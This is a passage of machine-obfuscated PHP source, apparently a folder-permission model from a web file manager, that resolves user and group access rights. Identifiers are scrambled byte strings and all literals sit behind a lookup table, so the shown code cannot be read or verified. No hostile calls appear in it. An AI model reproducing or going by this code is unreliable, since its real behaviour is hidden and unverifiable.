$Ò…ù›ï¼[$æ·—´¬•[525]], $æ·—´¬•[1867] => $Ò…ù›ï¼[$æ·—´¬•[1867]], $æ·—´¬•[522] => $Ò…ù›ï¼[$æ·—´¬•[441]], $æ·—´¬•[2051] => array($ŒÈú…íØ)); $‚ˆê’â[$€û¼ÈÄ[$æ·—´¬•[411]]] = $€û¼ÈÄ; } } $¶æí­×÷ = array(); $ÁóÜàÅ— = $this->getAllChildren($Ÿ”ÈîÄ); foreach ($ÁóÜàÅ— as $ÉÉìĞÒ) { $¯ŞÏóŸÆ = !1; foreach ($ÉÉìĞÒ[$æ·—´¬•[2051]] as $”úáÜˆË) { if ($”úáÜˆË[$æ·—´¬•[1678]]) { if ($”úáÜˆË[$æ·—´¬•[1678]] == $ó£²¡£ñ) { $¯ŞÏóŸÆ = !0; break; } } if ($”úáÜˆË[$æ·—´¬•[1867]]) { if ($this->groupContainUser($”úáÜˆË[$æ·—´¬•[1867]], $ó£²¡£ñ)) { $¯ŞÏóŸÆ = !0; break; } } } if ($¯ŞÏóŸÆ) { $¶æí­×÷[] = $ÉÉìĞÒ; } $†¶¨öß = $ÉÉìĞÒ[$æ·—´¬•[411]]; if (isset($‚ˆê’â[$†¶¨öß])) { $ÉÉìĞÒ[$æ·—´¬•[2051]][] = $‚ˆê’â[$†¶¨öß][0]; $‚ˆê’â[$†¶¨öß] = !1; } } $‚ˆê’â = array_filter(array_values($‚ˆê’â)); $¶æí­×÷ = array_merge($‚ˆê’â, $¶æí­×÷); return $¶æí­×÷; } public function setAllChildrenByUser($Í×œĞŸ, $†“Å¿ƒ½, $“Œ’) { $œôÛˆ‹Ù =& $_SERVER[ï»»·÷á]; $»çÁÈ±ˆ = $this->getAllChildrenByUser($Í×œĞŸ, $†“Å¿ƒ½); if (!$“Œ’ || !$»çÁÈ±ˆ) { return !1; } foreach ($»çÁÈ±ˆ as $Ç˜®øŠÑ) { $“«—Œ¦ = array(); foreach ($Ç˜®øŠÑ[$œôÛˆ‹Ù[2051]] as $ŠïÏƒ‰˜) { $ğâğËë’ = $ŠïÏƒ‰˜[$œôÛˆ‹Ù[476]]; $ÜºÍğÎê = $ŠïÏƒ‰˜[$œôÛˆ‹Ù[1678]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $¼¦—ˆÃ” = $ŠïÏƒ‰˜[$œôÛˆ‹Ù[1678]] ? $ŠïÏƒ‰˜[$œôÛˆ‹Ù[1678]] : $ŠïÏƒ‰˜[$œôÛˆ‹Ù[1867]]; if ($ŠïÏƒ‰˜[$œôÛˆ‹Ù[1678]] && $ŠïÏƒ‰˜[$œôÛˆ‹Ù[1678]] == $†“Å¿ƒ½) { continue; } $“«—Œ¦[] = array($œôÛˆ‹Ù[411] => $Ç˜®øŠÑ[$œôÛˆ‹Ù[411]], $œôÛˆ‹Ù[420] => $ÜºÍğÎê, $œôÛˆ‹Ù[505] => intval($¼¦—ˆÃ”), $œôÛˆ‹Ù[1971] => isset($ğâğËë’[$œôÛˆ‹Ù[399]]) ? intval($ğâğËë’[$œôÛˆ‹Ù[399]]) : 0, $œôÛˆ‹Ù[2031] => isset($ğâğËë’[$œôÛˆ‹Ù[2031]]) ? intval($ğâğËë’[$œôÛˆ‹Ù[2031]]) : -1); } $“«—Œ¦[] = array($œôÛˆ‹Ù[411] => $Ç˜®øŠÑ[$œôÛˆ‹Ù[411]], $œôÛˆ‹Ù[420] => SourceModel::TYPE_USER, $œôÛˆ‹Ù[505] => intval($†“Å¿ƒ½), $œôÛˆ‹Ù[1971] => intval($“Œ’), $œôÛˆ‹Ù[2031] => -1); $this->where(array($œôÛˆ‹Ù[426] => $Ç˜®øŠÑ[$œôÛˆ‹Ù[411]]))->delete(); $this->addAll($“«—Œ¦); } return !0; } public function get($øœ¸„«Í) { $®´”ïÀÈ = $this->getSourceList(array($øœ¸„«Í), !0); return $®´”ïÀÈ[0]; } public function getSourceList($ÏôŠé», $‚İåÏ¥æ = false, $Ù™ÇÔöú = false) { $×£¦Ïï“ =& $_SERVER[ï»»·÷á]; if (!$ÏôŠé») { return array(); } $ÄŸ“Á™ù = Model($×£¦Ïï“[1349]); if (!$‚İåÏ¥æ && count($ÏôŠé») == 1) { $‚İåÏ¥æ = array(); $‚İåÏ¥æ[$ÏôŠé»[0]] = $ÄŸ“Á™ù->sourceInfo($ÏôŠé»[0]); } if (!$‚İåÏ¥æ) { $ÇÒƒ¥Ó = array($×£¦Ïï“[426] => array($×£¦Ïï“[427], $ÏôŠé»)); $‚İåÏ¥æ = $ÄŸ“Á™ù->field($×£¦Ïï“[2055])->where($ÇÒƒ¥Ó)->select(); $‚İåÏ¥æ = array_to_keyvalue($‚İåÏ¥æ, $×£¦Ïï“[411]); } $•¸‘ç¨å = $ÏôŠé»; foreach ($‚İåÏ¥æ as $­·‡½¢á => $¤‹ñ³ÇÙ) { $õì…ÅÛ = $ÄŸ“Á™ù->parentLevelArray($¤‹ñ³ÇÙ[$×£¦Ïï“[520]]); $•¸‘ç¨å = array_merge($•¸‘ç¨å, array($­·‡½¢á), array_reverse($õì…ÅÛ)); } $•¸‘ç¨å = array_values(array_unique($•¸‘ç¨å)); if (!$•¸‘ç¨å) { return array(); } $Í¯³”Â€ = $this->sourceAuthSelect($•¸‘ç¨å); $„¶ïÙüª = array(); foreach ($•¸‘ç¨å as $˜ó£Œê) { if (isset($Í¯³”Â€[$˜ó£Œê])) { $„¶ïÙüª[$˜ó£Œê] = $Í¯³”Â€[$˜ó£Œê]; } } $ˆ£ğó´± = $this->userIsRoot($Ù™ÇÔöú); $µöŒ¼ô– = AuthModel::authAll(); $–óÊ‡êû = array($×£¦Ïï“[423] => $µöŒ¼ô–, $×£¦Ïï“[2056] => array($×£¦Ïï“[428] => 0, $×£¦Ïï“[1873] => $µöŒ¼ô–, $×£¦Ïï“[429] => LNG($×£¦Ïï“[2057]), $×£¦Ïï“[1890] => $×£¦Ïï“[2058])); $õÑ‚áÔò = array(); foreach ($‚İåÏ¥æ as $˜ó£Œê => $ŸñİĞ¨†) { if ($ˆ£ğó´± && $GLOBALS[$×£¦Ïï“[6]][$×£¦Ïï“[1886]]) { $õÑ‚áÔò[$˜ó£Œê] = $–óÊ‡êû; continue; } $õÑ‚áÔò[$˜ó£Œê] = $this->makeSourceAuth($ŸñİĞ¨†, $„¶ïÙüª, $Ù™ÇÔöú); } return $õÑ‚áÔò; } public function authDeepCheck($µÂ•Æ¥ƒ, $€ğà›¡’ = false) { $¢¾ü‚şº =& $_SERVER[ï»»·÷á]; $€ğà›¡’ = $€ğà›¡’ ? $€ğà›¡’ : USER_ID; $¾¨÷˜Ìç = $this->makeAuthDeep($€ğà›¡’); if (!in_array($µÂ•Æ¥ƒ, $¾¨÷˜Ìç[$¢¾ü‚şº[2059]])) { return !1; } $ŸçÈùŒ² = array(); foreach ($¾¨÷˜Ìç[$¢¾ü‚şº[2060]] as $éÍäõÜ => $øªÌµÚ ) { if (!in_array($µÂ•Æ¥ƒ, $øªÌµÚ )) { continue; } $ŸçÈùŒ²[] = $éÍäõÜ; } if (!$ŸçÈùŒ²) { return !1; } $ŞÈ‰Şü = $ŸçÈùŒ² ? $ŸçÈùŒ²[0] : $µÂ•Æ¥ƒ; return array($¢¾ü‚şº[423] => -1, $¢¾ü‚şº[476] => array($¢¾ü‚şº[428] => $¢¾ü‚şº[1198], $¢¾ü‚şº[1873] => $¢¾ü‚şº[198], $¢¾ü‚şº[429] => LNG($¢¾ü‚şº[2061]), $¢¾ü‚şº[1890] => $¢¾ü‚şº[2062]), $¢¾ü‚şº[2063] => LNG($¢¾ü‚şº[2064]), $¢¾ü‚şº[2065] => $this->sourceAuthInfo($ŞÈ‰Şü)); } protected function makeAuthDeep($è·ø”­ï = false) { $Í”‡ş =& $_SERVER[ï»»·÷á]; static $‘Ô¤Ìµò = array(); $è·ø”­ï = $è·ø”­ï ? $è·ø”­ï : USER_ID; if (isset($‘Ô¤Ìµò[$è·ø”­ï])) { return $‘Ô¤Ìµò[$è·ø”­ï]; } $èæ” É† = Model($Í”‡ş[2066])->listData(); $×‰ˆÑú = array(); foreach ($èæ” É† as $‘›ãÀŞÄ) { if ($‘›ãÀŞÄ[$Í”‡ş[422]] == 0 && $‘›ãÀŞÄ[$Í”‡ş[1889]] == $Í”‡ş[88]) { $×‰ˆÑú[] = $‘›ãÀŞÄ[$Í”‡ş[399]]; } } $Ò°¸Ñ¿‘ = $this->userGroupParents($è·ø”­ï); $®‡è¦ß = array($Í”‡ş[420] => SourceModel::TYPE_USER, $Í”‡ş[505] => $è·ø”­ï); if ($Ò°¸Ñ¿‘) { $®‡è¦ß = array(array($Í”‡ş[420] => SourceModel::TYPE_USER, $Í”‡ş[505] => $è·ø”­ï), array($Í”‡ş[420] => SourceModel::TYPE_GROUP, $Í”‡ş[505] => array($Í”‡ş[427], $Ò°¸Ñ¿‘)), $Í”‡ş[1010] => $Í”‡ş[1965]); } $¹ì•Ú¯ê = $this->field($Í”‡ş[2067])->where($®‡è¦ß)->select(); $½ó©êÍ½ = array(); $ÈŠı·ƒ– = array_to_keyvalue_group($¹ì•Ú¯ê, $Í”‡ş[411]); foreach ($ÈŠı·ƒ– as $¶å¨¶— => $ŠöÙ¥µÆ) { $“•´È”’ = $this->authArrayCheck($ŠöÙ¥µÆ, $è·ø”­ï); if ($“•´È”’[$Í”‡ş[423]] > 0) { $½ó©êÍ½[] = $¶å¨¶— . $Í”‡ş[12]; } } if ($Ò°¸Ñ¿‘) { $ÑÆŸ½‹Ä = Model($Í”‡ş[521]); foreach ($Ò°¸Ñ¿‘ as $—·İäŒ½) { $Î•ÛöÁé = $ÑÆŸ½‹Ä->getInfo($—·İäŒ½); if (!$Î•ÛöÁé || !is_array($Î•ÛöÁé[$Í”‡ş[87]])) { continue; } $½ó©êÍ½[] = $Î•ÛöÁé[$Í”‡ş[87]][$Í”‡ş[411]]; } } $Ô˜èíØÔ = array(); $—®ùªÓÕ = $Ò°¸Ñ¿‘; $úµÉ‘—¾ = Model($Í”‡ş[1349]); $ÑÆŸ½‹Ä = Model($Í”‡ş[521]); $šœôæòå = array(); $²Ñü‚„› = array(); $ŸâÓÀìÕ = array(); $Ê¯’¶±á = array(); if ($½ó©êÍ½) { $çŒ‡¸·» = $úµÉ‘—¾->where(array($Í”‡ş[411] => array($Í”‡ş[427], $½ó©êÍ½)))->select(); foreach ($çŒ‡¸·» as $ŠƒÍÉç·) { $„üùÉ¨˜ = $úµÉ‘—¾->parentLevelArray($ŠƒÍÉç·[$Í”‡ş[520]]); $Ô˜èíØÔ = array_merge($Ô˜èíØÔ, $„üùÉ¨˜); $—®ùªÓÕ[] = $ŠƒÍÉç·[$Í”‡ş[505]]; $šœôæòå[$ŠƒÍÉç·[$Í”‡ş[411]]] = $„üùÉ¨˜; $²Ñü‚„›[$ŠƒÍÉç·[$Í”‡ş[411]]] = $ŠƒÍÉç·[$Í”‡ş[505]]; } } $—®ùªÓÕ = array_values(array_unique($—®ùªÓÕ)); $óà³ßš» = $—®ùªÓÕ; foreach ($óà³ßš» as $—·İäŒ½) { $Î•ÛöÁé = $ÑÆŸ½‹Ä->getInfo($—·İäŒ½); $„üùÉ¨˜ = $úµÉ‘—¾->parentLevelArray($Î•ÛöÁé[$Í”‡ş[520]]); $—®ùªÓÕ = array_merge($—®ùªÓÕ, $„üùÉ¨˜); } $—®ùªÓÕ = array_values(array_unique($—®ùªÓÕ)); foreach ($—®ùªÓÕ as $—·İäŒ½) { $Î•ÛöÁé = $ÑÆŸ½‹Ä->getInfo($—·İäŒ½); $Ô˜èíØÔ[] = $Î•ÛöÁé[$Í”‡ş[87]][$Í”‡ş[411]]; $ŸâÓÀìÕ[$—·İäŒ½] = $Î•ÛöÁé[$Í”‡ş[87]][$Í”‡ş[411]]; $Ê¯’¶±á[$—·İäŒ½] = $úµÉ‘—¾->parentLevelArray($Î•ÛöÁé[$Í”‡ş[520]]); } foreach ($šœôæòå as $±’İ¶Ç´ => $ÆİûÍıâ) { $ÌğÍƒ°¨ = $²Ñü‚„›[$±’İ¶Ç´]; if (!$ÌğÍƒ°¨ || !$ŸâÓÀìÕ[$ÌğÍƒ°¨]) { continue; } $³›ÜÛÌâ = array(); foreach ($Ê¯’¶±á[$ÌğÍƒ°¨] as $—·İäŒ½) { $³›ÜÛÌâ[] = $ŸâÓÀìÕ[$—·İäŒ½]; } $šœôæòå[$±’İ¶Ç´] = array_merge($³›ÜÛÌâ, $ÆİûÍıâ); } $Ô˜èíØÔ = array_values(array_unique($Ô˜èíØÔ)); $õ‘Æ¨âÎ = array($Í”‡ş[2059] => $Ô˜èíØÔ, $Í”‡ş[2060] => $šœôæòå); $‘Ô¤Ìµò[$è·ø”­ï] = $õ‘Æ¨âÎ; return $õ‘Æ¨âÎ; } private function makeSourceAuth($œëèì×É, $âï¹°ÀÂ, $½ğ¾Ë‰â = false) { $ÖàÓ¸à =& $_SERVER[ï»»·÷á]; $‡Òç‡¸š = $ÖàÓ¸à[88]; $µë”üƒ¢ = $œëèì×É[$ÖàÓ¸à[505]]; $äŠ¼ÉµØ = $œëèì×É[$ÖàÓ¸à[420]] == SourceModel::TYPE_GROUP; $›¨¢öÈ¶ = $äŠ¼ÉµØ ? $this->groupRootAuth($µë”üƒ¢, $½ğ¾Ë‰â) : !1; if ($›¨¢öÈ¶ && Model($ÖàÓ¸à[507])->authCheckAction($›¨¢öÈ¶[$ÖàÓ¸à[422]], $ÖàÓ¸à[1888])) { return $this->groupAuthInfo($›¨¢öÈ¶, $µë”üƒ¢); } $ÓÜéƒ³ = Model($ÖàÓ¸à[1349])->parentLevelArray($œëèì×É[$ÖàÓ¸à[520]]); $ÓÜéƒ³ = array_merge(array($œëèì×É[$ÖàÓ¸à[411]]), array_reverse($ÓÜéƒ³)); $§Áœí­Â = !1; foreach ($ÓÜéƒ³ as $ÏÈËí¡) { if (!isset($âï¹°ÀÂ[$ÏÈËí¡])) { continue; } $Ò¨§èï› = $this->authMake($âï¹°ÀÂ[$ÏÈËí¡], $½ğ¾Ë‰â); if ($Ò¨§èï›[$ÖàÓ¸à[476]]) { $§Áœí­Â = $Ò¨§èï›; break; } } if (!$äŠ¼ÉµØ) { return $§Áœí­Â; } if (!$§Áœí­Â && $›¨¢öÈ¶) { $§Áœí­Â = $this->groupAuthInfo($›¨¢öÈ¶, $µë”üƒ¢); } if (!$§Áœí­Â) { $Ãşüû—š = Model($ÖàÓ¸à[521])->getInfo($µë”üƒ¢); $¨»©¦ø = explode($ÖàÓ¸à[50], trim($Ãşüû—š[$ÖàÓ¸à[520]], $ÖàÓ¸à[50])); $¨»©¦ø = array_reverse($¨»©¦ø); foreach ($¨»©¦ø as $ëÙ³ÉĞ¹) { if ($ëÙ³ÉĞ¹ == $ÖàÓ¸à[198] || $ëÙ³ÉĞ¹ == $‡Òç‡¸š) { continue; } $Œà£¶øô = $this->groupRootAuth($ëÙ³ÉĞ¹, $½ğ¾Ë‰â); if (!$Œà£¶øô) { continue; } $§Áœí­Â = $this->groupAuthInfo($Œà£¶øô, $ëÙ³ÉĞ¹); break; } } if (!$§Áœí­Â || $§Áœí­Â[$ÖàÓ¸à[423]] <= 0) { $ÖğŸ—âİ = $this->authDeepCheck($œëèì×É[$ÖàÓ¸à[411]], $½ğ¾Ë‰â); if ($ÖğŸ—âİ) { $§Áœí­Â = $ÖğŸ—âİ; } } return $§Áœí­Â; } private function userIsRoot($©¤âéŒó = false) { $ĞÙç÷æî =& $_SERVER[ï»»·÷á]; if (!$©¤âéŒó && _get($GLOBALS, $ĞÙç÷æî[503])) { return !0; } $©½·´â = Model($ĞÙç÷æî[534])->getInfo($©¤âéŒó); $€Œ—Çğ… = Model($ĞÙç÷æî[2068])->listData($©½·´â[$ĞÙç÷æî[1557]]); if ($€Œ—Çğ… && $€Œ—Çğ…[$ĞÙç÷æî[511]][$ĞÙç÷æî[2069]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ÕŠ­Ò) { $íÍµÔÑ =& $_SERVER[ï»»·÷á]; $²»•˜÷ƒ = Model($íÍµÔÑ[1349]); $ËÍ‰Ø‡ = $²»•˜÷ƒ->sourceInfo($ÕŠ­Ò); if (!$ËÍ‰Ø‡) { return !1; } $²»•˜÷ƒ->groupPathDisplay($ËÍ‰Ø‡); $ö¢ ª”Â = array($ËÍ‰Ø‡); $ö¢ ª”Â = $²»•˜÷ƒ->_listAppendPath($ö¢ ª”Â); $ËÍ‰Ø‡ = $ö¢ ª”Â[0]; $æØÌ¤¤É = $ËÍ‰Ø‡[$íÍµÔÑ[518]]; if (isset($ËÍ‰Ø‡[$íÍµÔÑ[526]])) { $™õ’Ú†ˆ = explode($íÍµÔÑ[8], trim($ËÍ‰Ø‡[$íÍµÔÑ[518]], $íÍµÔÑ[8])); array_shift($™õ’Ú†ˆ); $æØÌ¤¤É = $ËÍ‰Ø‡[$íÍµÔÑ[524]] . $íÍµÔÑ[2070] . implode($íÍµÔÑ[8], $™õ’Ú†ˆ); } return array($íÍµÔÑ[429] => $ËÍ‰Ø‡[$íÍµÔÑ[32]], $íÍµÔÑ[84] => KodIO::make($ËÍ‰Ø‡[$íÍµÔÑ[411]]), $íÍµÔÑ[2071] => $æØÌ¤¤É); } private function groupAuthInfo($ç—‡‘µÖ, $‚²ıÊÖ’) { $é”ğëğ° =& $_SERVER[ï»»·÷á]; $†ÔëĞáÒ = Model($é”ğëğ°[521])->getInfo($‚²ıÊÖ’); return array($é”ğëğ°[2072] => intval($ç—‡‘µÖ[$é”ğëğ°[422]]), $é”ğëğ°[2056] => $ç—‡‘µÖ, $é”ğëğ°[2073] => LNG($é”ğëğ°[2074]), $é”ğëğ°[2065] => array($é”ğëğ°[429] => $†ÔëĞáÒ[$é”ğëğ°[32]], $é”ğëğ°[84] => KodIO::make($†ÔëĞáÒ[$é”ğëğ°[87]][$é”ğëğ°[411]]), $é”ğëğ°[2071] => $†ÔëĞáÒ[$é”ğëğ°[525]])); } protected function groupRootAuth($Ğ¦ÒÕ†¬, $›ùŸÊ©’ = false) { $üı§ÄıÂ =& $_SERVER[ï»»·÷á]; $›ùŸÊ©’ = $›ùŸÊ©’ ? $›ùŸÊ©’ : USER_ID; $ÌáŸ€ç = $›ùŸÊ©’ . $üı§ÄıÂ[2075] . $Ğ¦ÒÕ†¬; static $³ı¸äÊ— = array(); if (isset($³ı¸äÊ—[$ÌáŸ€ç])) { return $³ı¸äÊ—[$ÌáŸ€ç]; } $ËÀæƒ¾Î = Model($üı§ÄıÂ[521])->getInfo($Ğ¦ÒÕ†¬); $¯ù‹å Ô = $this->userGroupList($›ùŸÊ©’); $­ÊÈæÔº = isset($¯ù‹å Ô[$Ğ¦ÒÕ†¬]) ? $¯ù‹å Ô[$Ğ¦ÒÕ†¬][$üı§ÄıÂ[422]] : !1; if ($­ÊÈæÔº && Model($üı§ÄıÂ[507])->authCheckAction($­ÊÈæÔº[$üı§ÄıÂ[422]], $üı§ÄıÂ[1888])) { $³ı¸äÊ—[$ÌáŸ€ç] = $­ÊÈæÔº; return $­ÊÈæÔº; } $‘ÁôÆéü = $this->sourceAuthSelect($ËÀæƒ¾Î[$üı§ÄıÂ[87]][$üı§ÄıÂ[411]]); $›˜‰ş¡ì = $‘ÁôÆéü ? $this->authMake($‘ÁôÆéü, $›ùŸÊ©’) : !1; $Œİé¬‡² = $›˜‰ş¡ì ? $›˜‰ş¡ì[$üı§ÄıÂ[476]] : !1; $³ı¸äÊ—[$ÌáŸ€ç] = $Œİé¬‡² ? $Œİé¬‡² : $­ÊÈæÔº; return $³ı¸äÊ—[$ÌáŸ€ç]; } public function authOwnerApply($äÓËˆÍ²) { $°› œÊ¤ =& $_SERVER[ï»»·÷á]; if (empty($äÓËˆÍ²[$°› œÊ¤[422]]) || isset($äÓËˆÍ²[$°› œÊ¤[2076]]) && $äÓËˆÍ²[$°› œÊ¤[2076]]) { return $äÓËˆÍ²; } if (AuthModel::authCheckRoot($äÓËˆÍ²[$°› œÊ¤[422]][$°› œÊ¤[423]])) { return $äÓËˆÍ²; } $‘²Ğ¸÷« = Model($°› œÊ¤[1349])->parentLevelArray($äÓËˆÍ²[$°› œÊ¤[520]]); $‘²Ğ¸÷« = array_merge(array($äÓËˆÍ²[$°› œÊ¤[411]]), array_reverse($‘²Ğ¸÷«)); $íÚØÂ§· = $this->sourceAuthSelect($‘²Ğ¸÷«); $´È†à»Æ = array(); $¿óÕÔÍØ = array(); foreach ($íÚØÂ§· as $‘ƒ¾ƒòÅ => $³Ö–¹„ß) { $¿÷úïìµ = $this->authFolderOwnerUser($³Ö–¹„ß); $´È†à»Æ[$‘ƒ¾ƒòÅ] = $¿÷úïìµ; $¿óÕÔÍØ = array_merge($¿óÕÔÍØ, $¿÷úïìµ[$°› œÊ¤[599]]); if ($¿÷úïìµ[$°› œÊ¤[2077]]) { break; } } if (count($¿óÕÔÍØ) == 0) { $¿óÕÔÍØ = $this->authFolderOwnerGroup($äÓËˆÍ²[$°› œÊ¤[505]]); } $¿óÕÔÍØ = array_unique($¿óÕÔÍØ); if (AuthModel::authCheckRoot($äÓËˆÍ²[$°› œÊ¤[422]][$°› œÊ¤[423]])) { $¿óÕÔÍØ[] = USER_ID; } $äÓËˆÍ²[$°› œÊ¤[422]][$°› œÊ¤[2078]] = Model($°› œÊ¤[513])->userListInfo($¿óÕÔÍØ); return $äÓËˆÍ²; } private function authFolderOwnerGroup($À×šÃ) { $±øÏåÄã =& $_SERVER[ï»»·÷á]; $âÅáõË¢ = Model($±øÏåÄã[1957])->where(array($±øÏåÄã[1867] => $À×šÃ))->select(); $š¤§ø§À = array(); if (!$âÅáõË¢) { return $š¤§ø§À; } foreach ($âÅáõË¢ as $½ Ì…£ª) { $Ÿ–ß¨ÅÆ = $this->authInfo($½ Ì…£ª); if (AuthModel::authCheckRoot($Ÿ–ß¨ÅÆ[$±øÏåÄã[422]])) { $š¤§ø§À[] = $½ Ì…£ª[$±øÏåÄã[1678]]; } } return $š¤§ø§À; } private function authFolderOwnerUser($Áßº“Øá) { $¬°¡¼ç =& $_SERVER[ï»»·÷á]; $÷¬ööğ­ = array(); $Œéº»´ = !1; foreach ($Áßº“Øá as $ç­—¼©è) { $Ö‡“¾Èï = $this->authInfo($ç­—¼©è); if ($ç­—¼©è[$¬°¡¼ç[505]] == $¬°¡¼ç[198]) { $Œéº»´ = !0; } if ($ç­—¼©è[$¬°¡¼ç[420]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Ö‡“¾Èï[$¬°¡¼ç[422]])) { $÷¬ööğ­[] = $ç­—¼©è[$¬°¡¼ç[505]]; } } } return array($¬°¡¼ç[599] => $÷¬ööğ­, $¬°¡¼ç[2077] => $Œéº»´); } public function authMake($¾£›¯±, $®´œûÍú = false) { $şøäôòª =& $_SERVER[ï»»·÷á]; $ÑÍÆê› = $this->authArrayCheck($¾£›¯±, $®´œûÍú); if ($ÑÍÆê›[$şøäôòª[2079]]) { $ÑÍÆê›[$şøäôòª[2079]] = $this->sourceAuthInfo($ÑÍÆê›[$şøäôòª[2079]]); } return $ÑÍÆê›; } public function authArrayCheck($å¶—¶–´, $¿éÙş®Ö = false) { $ŞÌªÅ‘î =& $_SERVER[ï»»·÷á]; if (!$å¶—¶–´) { return array($ŞÌªÅ‘î[423] => 0, $ŞÌªÅ‘î[476] => !1); } $¿éÙş®Ö = $¿éÙş®Ö ? $¿éÙş®Ö : USER_ID; $‹Ä¶íï = 0; $…—À­¶§ = 0; $ÒÌ¼¾¹™ = 0; $Ôœ´İ— = 0; $ÓïÂĞø = 0; $àÕù¹—’ = 0; $»¹Á‹Çõ = 1000; $çû–š…Ï = 0; $ğ¸Öê•  = 0; $áâÙòïä = 0; $µ—è‚ = 0; $‰ìµ—Š  = array($ŞÌªÅ‘î[411] => 0); foreach ($å¶—¶–´ as $‰ìµ—Š ) { $‹íõõ· = $this->authInfo($‰ìµ—Š ); if (!$‹íõõ·) { continue; } $‘£Ìäí = $‰ìµ—Š [$ŞÌªÅ‘î[505]]; $Ó›¹ÁÌ‹ = intval($‹íõõ·[$ŞÌªÅ‘î[422]]); if ($‰ìµ—Š [$ŞÌªÅ‘î[420]] == SourceModel::TYPE_USER && $‘£Ìäí == $¿éÙş®Ö) { $‹Ä¶íï = !0; $ÒÌ¼¾¹™ = $‹íõõ·; $…—À­¶§ = $Ó›¹ÁÌ‹; } else { if ($‰ìµ—Š [$ŞÌªÅ‘î[420]] == SourceModel::TYPE_GROUP && $this->groupContainUser($‘£Ìäí, $¿éÙş®Ö)) { $Ôœ´İ— = !0; $±ü¦¬ò = $this->groupStepToUserGroup($‘£Ìäí, $¿éÙş®Ö); if ($±ü¦¬ò < $»¹Á‹Çõ) { $»¹Á‹Çõ = $±ü¦¬ò; $ÓïÂĞø = $Ó›¹ÁÌ‹; $àÕù¹—’ = $‹íõõ·; $çû–š…Ï = $‘£Ìäí; } if ($±ü¦¬ò == $»¹Á‹Çõ && $Ó›¹ÁÌ‹ >= $ÓïÂĞø) { $ÓïÂĞø = $Ó›¹ÁÌ‹; $àÕù¹—’ = $‹íõõ·; $çû–š…Ï = $‘£Ìäí; } } else { if ($‘£Ìäí == $ŞÌªÅ‘î[198]) { $ğ¸Öê•  = !0; $µ—è‚ = $‹íõõ·; $áâÙòïä = $Ó›¹ÁÌ‹; } } } } if ($‹Ä¶íï) { $ÙşË¢¯ˆ = $…—À­¶§; $‹íõõ· = $ÒÌ¼¾¹™; $¤¯ãğ‡— = LNG($ŞÌªÅ‘î[2080]); } else { if ($Ôœ´İ—) { $ÙşË¢¯ˆ = $ÓïÂĞø; $‹íõõ· = $àÕù¹—’; $¦õÀÁ¥í = Model($ŞÌªÅ‘î[521])->getInfo($çû–š…Ï); $¤¯ãğ‡— = $ŞÌªÅ‘î[162] . $¦õÀÁ¥í[$ŞÌªÅ‘î[525]] . $ŞÌªÅ‘î[2081] . LNG($ŞÌªÅ‘î[2082]); } else { if ($ğ¸Öê• ) { $ÙşË¢¯ˆ = $áâÙòïä; $‹íõõ· = $µ—è‚; $¤¯ãğ‡— = LNG($ŞÌªÅ‘î[2053]); } else { $ÙşË¢¯ˆ = 0; $‹íõõ· = !1; $¤¯ãğ‡— = $ŞÌªÅ‘î[12]; } } } $Ä•Ù®áï = array($ŞÌªÅ‘î[2072] => intval($ÙşË¢¯ˆ), $ŞÌªÅ‘î[2056] => $‹íõõ·, $ŞÌªÅ‘î[2073] => $¤¯ãğ‡—, $ŞÌªÅ‘î[2065] => $‰ìµ—Š [$ŞÌªÅ‘î[411]]); return $Ä•Ù®áï; } private function groupContainUser($â—™Áú‘, $¹ÈÑÄ½„ = false) { return in_array($â—™Áú‘, $this->userGroupParents($¹ÈÑÄ½„)); } private function groupStepToUserGroup($õ¦êŞøé, $ÀÂ°Ø„İ = false) { $ÉÚÊıÇ =& $_SERVER[ï»»·÷á]; $ÈÜªò× = $this->userGroupList($ÀÂ°Ø„İ); $Òóñˆû¯ = 1000; $Òˆº¤Á² = $GLOBALS[$ÉÚÊıÇ[6]][$ÉÚÊıÇ[89]][$ÉÚÊıÇ[1970]] == 1; $¨•ıûÉç = $Òˆº¤Á² ? 3 : 2; foreach ($ÈÜªò× as $„Œ¬Õµ¥) { if ($„Œ¬Õµ¥[$ÉÚÊıÇ[1867]] == $õ¦êŞøé) { return 0; } $¹Ú¸ÛÊ = explode($ÉÚÊıÇ[50], trim($„Œ¬Õµ¥[$ÉÚÊıÇ[520]], $ÉÚÊıÇ[50])); if ($¹Ú¸ÛÊ[0] == $ÉÚÊıÇ[198] && count($¹Ú¸ÛÊ) > $¨•ıûÉç) { $ÄºÀ†–ì = array_reverse(array_slice($¹Ú¸ÛÊ, $¨•ıûÉç)); $‹‰şî„ò = array_search($õ¦êŞøé, $ÄºÀ†–ì); if ($‹‰şî„ò !== !1 && $‹‰şî„ò + 1 <= $Òóñˆû¯) { $Òóñˆû¯ = $‹‰şî„ò + 1; } } } return $Òóñˆû¯; } private function userGroupList($…ì—¢„ = false) { $­ş¦Ë¿‘ =& $_SERVER[ï»»·÷á]; static $»Ê¸çŸ = array(); if (isset($»Ê¸çŸ[$…ì—¢„])) { return $»Ê¸çŸ[$…ì—¢„]; } $Ëâ„ô—Ğ = Model($­ş¦Ë¿‘[534])->getInfo($…ì—¢„); $»Ê¸çŸ[$…ì—¢„] = array_to_keyvalue($Ëâ„ô—Ğ[$­ş¦Ë¿‘[2054]], $­ş¦Ë¿‘[1867]); return $»Ê¸çŸ[$…ì—¢„]; } public function userGroupParents($‹æóä‰) { $ğƒ‡Â‹« =& $_SERVER[ï»»·÷á]; static $Ãäî­ñ« = array(); $‹æóä‰ = $‹æóä‰ ? $‹æóä‰ : USER_ID; if (isset($Ãäî­ñ«[$‹æóä‰])) { return $Ãäî­ñ«[$‹æóä‰]; } $­©û«Ô˜ = $this->userGroupList($‹æóä‰); $Ëš¬÷í = array(); $…Ó¶ÄÑ† = $GLOBALS[$ğƒ‡Â‹«[6]][$ğƒ‡Â‹«[89]][$ğƒ‡Â‹«[1970]] == 1; $ÂÍÂÎã™ = $…Ó¶ÄÑ† ? 3 : 2; foreach ($­©û«Ô˜ as $º—©üÙ¡) { $ø¯ùùÏé = array($º—©üÙ¡[$ğƒ‡Â‹«[1867]]); $úßìÈ– = explode($ğƒ‡Â‹«[50], trim($º—©üÙ¡[$ğƒ‡Â‹«[520]], $ğƒ‡Â‹«[50])); if ($úßìÈ–[0] == $ğƒ‡Â‹«[198] && count($úßìÈ–) > $ÂÍÂÎã™) { $ùùçÎŸÙ = array_slice($úßìÈ–, $ÂÍÂÎã™); $ø¯ùùÏé = array_merge($ø¯ùùÏé, array_reverse($ùùçÎŸÙ)); } 